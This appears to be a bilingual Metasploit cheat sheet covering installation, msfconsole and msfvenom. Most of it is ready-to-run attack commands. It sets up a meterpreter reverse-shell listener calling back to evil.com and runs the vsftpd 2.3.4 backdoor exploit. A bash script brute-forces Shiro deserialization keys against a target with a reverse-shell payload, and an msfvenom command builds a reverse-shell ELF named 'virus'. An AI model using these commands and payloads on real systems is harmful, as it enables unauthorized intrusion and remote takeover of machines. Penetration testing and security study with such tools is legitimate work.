The world’s most used penetration testing framework.

## 1. Install

安装

```
┌──(nemo@debian)-[~]
└─$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > ~/msfinstall \
&& chmod 755 ~/msfinstall \
&& ~/msfinstall && rm -f ~/msfinstall
```

## 2. Init

```
┌──(nemo@debian)-[~]
└─$ msfdb init
```

## 3. Usage

### 3.1. msfconsole

启动数据库

```
┌──(nemo@debian)-[~]
└─$ msfdb start
```

进入控制台

```
┌──(nemo@debian)-[~]
└─$ msfconsole
```

Listen

```
msf > use exploit/multi/handler
show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
show options
set LHOST evil.com
set LPORT 4444
run
```

Exploit

```
msf > search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
show payloads
set PAYLOAD cmd/unix/interact
show options
set RHOSTS example.com
set RPORT 80
set LHOST/CHOST evil.com
set LPORT/CPORT 4444
set TARGET 0
check
run
```

Script

```
#!/bin/bash

RHOSTS="example.com"
RPORT="80"
MODULE="exploit/multi/http/shiro_rememberme_v124_deserialize"
PAYLOAD="cmd/unix/reverse"
LHOST="evil.com"
LPORT="4444"
KEYFILE="$HOME/shiro_keys.txt"

while IFS= read -r KEY || [ -n "$KEY" ]; do
  echo "[*] Key: $KEY"
  msfconsole -q -x "use ${MODULE}
set RHOSTS ${RHOSTS}
set RPORT ${RPORT}
set ENC_KEY ${KEY}
set PAYLOAD ${PAYLOAD}
set LHOST ${LHOST}
set LPORT ${LPORT}
exploit
exit" 

done < "$KEYFILE"

```

```
msf > help       # 列出所有命令帮助
<command> -h     # 列出指定命令的常用帮助
help <command>   # 列出指定命令的完整帮助
back             # 返回
exit             # 退出
check            # 探测漏洞
run              # 执行模块
run -j           # 后台执行模块
jobs             # 列出后台任务
jobs -v          # 列出后台任务详情
jobs -K <Id>     # 终止所有后台任务
jobs -k <Id>     # 终止指定后台任务
sessions         # 列出会话
sessions -i <Id> # 进入会话
sessions -k <Id> # 终止会话
```

### 3.2. msfvenom

生成病毒

```
┌──(nemo@debian)-[~]
└─$ msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=evil.com LPORT=4444 -f elf -o ~/virus
```

---

References

- [Metasploit](https://www.metasploit.com/)
- [Installing Metasploit on Linux / macOS](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)

